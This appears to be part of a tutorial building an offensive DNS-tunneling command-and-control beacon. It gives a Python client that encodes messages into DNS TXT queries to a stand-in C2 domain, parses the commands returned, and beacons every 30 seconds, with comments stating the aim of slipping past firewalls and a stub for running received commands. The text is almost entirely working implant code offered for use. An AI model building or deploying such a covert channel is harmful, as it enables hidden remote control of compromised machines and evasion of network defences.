#Phase 3: Building the Client (The Beacon)

#The client doesn't talk to your VPS directly. It talks to a local DNS resolver (like a router or 8.8.8.8), 
# which makes it look like normal web traffic to most firewalls.

import time
import base64
import subprocess
import re

DOMAIN = "c2.yourdomain.com"

def get_command(payload):
    # Encode payload to Base32 (DNS names are case-insensitive, so B32 is safer than B64)
    encoded = base64.b32encode(payload.encode()).decode().replace("=", "").lower()
    full_query = f"{encoded}.{DOMAIN}"
    
    # Use system's nslookup to perform the tunneling
    try:
        output = subprocess.check_output(["nslookup", "-type=TXT", full_query], stderr=subprocess.STDOUT).decode()
        
        # Regex to find the TXT record content in the nslookup output
        match = re.search(r'text\s+=\s+"([^"]+)"', output)
        if match:
            return match.group(1)
    except Exception as e:
        return None
    return None

while True:
    print("[!] Sending Beacon...")
    command = get_command("heartbeat")
    
    if command:
        print(f"[+] Received Command from C2: {command}")
        # Here you would add logic to execute the command:
        # if "whoami" in command: ...
        
    time.sleep(30) # Beacon every 30 seconds